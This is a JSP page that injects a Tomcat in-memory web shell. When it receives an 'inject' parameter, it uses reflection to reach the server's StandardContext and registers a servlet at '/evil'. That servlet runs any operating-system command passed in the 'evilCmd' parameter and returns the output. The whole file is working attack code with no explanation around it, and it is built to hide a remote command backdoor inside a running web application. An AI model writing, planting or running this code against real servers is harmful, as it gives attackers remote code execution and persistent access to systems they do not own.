<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>

<%
    class EvilServlet extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            // this method is called for every GET request for "/evil"
            String cmd = req.getParameter("evilCmd");
            if (cmd != null) {
                InputStream input = Runtime.getRuntime().exec(cmd).getInputStream();
                ServletOutputStream output = resp.getOutputStream();
                byte[] buffer = new byte[1024];
                int len;
                while ((len = input.read(buffer)) != -1) {
                    output.write(buffer, 0, len);
                }
                output.flush();
                output.close(); // not allow servlet to modify the response
            } else {
                resp.setContentType("text/html");
                resp.getWriter().println("<h1>Evil Servlet</h1>");
            }
        }
    }


    if (request.getParameter("inject") != null) {
        try {
            // get StandardContext obj
            ApplicationContextFacade ctx1 = (ApplicationContextFacade) request.getServletContext();
            Field ctx1Field = ApplicationContextFacade.class.getDeclaredField("context");
            ctx1Field.setAccessible(true);
            ApplicationContext ctx2 = (ApplicationContext) ctx1Field.get(ctx1);
            Field ctx2Field = ApplicationContext.class.getDeclaredField("context");
            ctx2Field.setAccessible(true);
            StandardContext ctx3 = (StandardContext) ctx2Field.get(ctx2);

            // create StandardWrapper obj for the EvilServlet
            EvilServlet evilServlet = new EvilServlet();
            StandardWrapper evilWrapper = new StandardWrapper();
            evilWrapper.setServletName("evilServlet");
            evilWrapper.setServletClass(evilServlet.getClass().getName());
            evilWrapper.setServlet(evilServlet);

            // add StandardWrapper obj to 'children' of StandardContext
            ctx3.addChild(evilWrapper);
            // add servlet mapping for the EvilServlet
            ctx3.addServletMappingDecoded("/evil", "evilServlet");
            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }
    }
%>